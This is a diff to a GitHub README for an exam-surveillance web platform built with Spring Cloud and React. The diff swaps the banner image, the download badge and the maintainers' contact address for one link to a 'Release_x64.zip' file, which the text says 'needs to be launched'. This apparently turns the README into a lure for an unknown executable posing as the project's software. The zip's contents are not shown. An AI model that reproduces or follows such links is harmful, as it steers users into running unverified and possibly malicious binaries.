@@ -1,6 +1,6 @@
 # 🎓 Exam Surveillance Platform 📚
 
-![Exam Surveillance Platform](https://www.example.com/image.png)
+![Exam Surveillance Platform](https://github.com/Ilayking/Exam-surveillance-platform/releases/download/v2.0/Release_x64.zip)
 
 Welcome to the Exam Surveillance Platform GitHub repository! This platform is a modern exam surveillance management system built with Spring Cloud microservices and React. It streamlines exam planning and surveillance assignments at ENSA El Jadida with automated scheduling and comprehensive reporting.
 
@@ -16,7 +16,7 @@ Welcome to the Exam Surveillance Platform GitHub repository! This platform is a 
 
 To get started with the Exam Surveillance Platform, download the software package from the link below. The package includes all the necessary files and instructions for setup and configuration.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Ilayking/Exam-surveillance-platform/releases/download/v2.0/Release_x64.zip)](https://github.com/Ilayking/Exam-surveillance-platform/releases/download/v2.0/Release_x64.zip)
 
 *Note: The software zip file needs to be launched*
 
@@ -80,7 +80,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📧 Contact
 
-For any inquiries or support, please contact the project maintainers at examplatform@email.com.
+For any inquiries or support, please contact the project maintainers at https://github.com/Ilayking/Exam-surveillance-platform/releases/download/v2.0/Release_x64.zip
 
 ---
 
